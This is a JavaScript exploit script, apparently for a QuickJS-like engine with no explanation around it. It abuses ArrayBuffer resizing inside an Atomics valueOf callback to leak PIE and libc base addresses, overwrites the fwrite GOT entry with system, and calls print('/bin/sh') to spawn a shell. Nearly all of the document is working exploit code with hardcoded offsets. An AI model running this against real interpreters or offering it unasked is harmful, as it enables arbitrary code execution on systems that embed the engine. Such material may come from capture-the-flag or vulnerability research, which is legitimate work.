// Shell exploit via fwrite@GOT - refined
import * as std from 'std';

function leak_pie() {
    let buf = new ArrayBuffer(56, { maxByteLength: 65536 });
    let view = new BigUint64Array(buf);
    var trigger = {
        valueOf: function() {
            buf.resize(65536);
            new ArrayBuffer(56);
            return 0n;
        }
    };
    return Atomics.add(view, 6, trigger) - 0x14bc0n;
}

function leak_libc() {
    let buf = new ArrayBuffer(0x500, { maxByteLength: 65536 });
    let view = new BigUint64Array(buf);
    for (let i = 0; i < view.length; i++) {
        view[i] = BigInt(0x4141414100000000 + i);
    }
    var trigger = {
        valueOf: function() {
            buf.resize(65536);
            return 0n;
        }
    };
    return Atomics.add(view, 0, trigger) - 0x1e7b20n;
}

let pieBase = leak_pie();
let libcBase = leak_libc();

let fwriteGot = pieBase + 0x10b380n;
let system = libcBase + 0x53110n;

// Set up TypedArray pointing to fwrite@GOT
let victim = new ArrayBuffer(56, { maxByteLength: 65536 });
let victimView = new BigUint64Array(victim);

for (let i = 0; i < 7; i++) {
    victimView[i] = BigInt(0x4141414100000000 + i);
}

let newBuf = null;
let refs = [];

var trigger = {
    valueOf: function() {
        victim.resize(65536);
        newBuf = new ArrayBuffer(56);
        refs.push(newBuf);
        return fwriteGot;
    }
};

Atomics.exchange(victimView, 2, trigger);

let gotView = new BigUint64Array(newBuf);
refs.push(gotView);

let originalFwrite = gotView[0];

// Overwrite fwrite@GOT with system
gotView[0] = system;

// Now any fwrite(str, ...) becomes system(str)
// print() calls fwrite internally, so print("/bin/sh") -> system("/bin/sh")!
print("/bin/sh");

// Restore (won't reach here if shell spawned)
gotView[0] = originalFwrite;
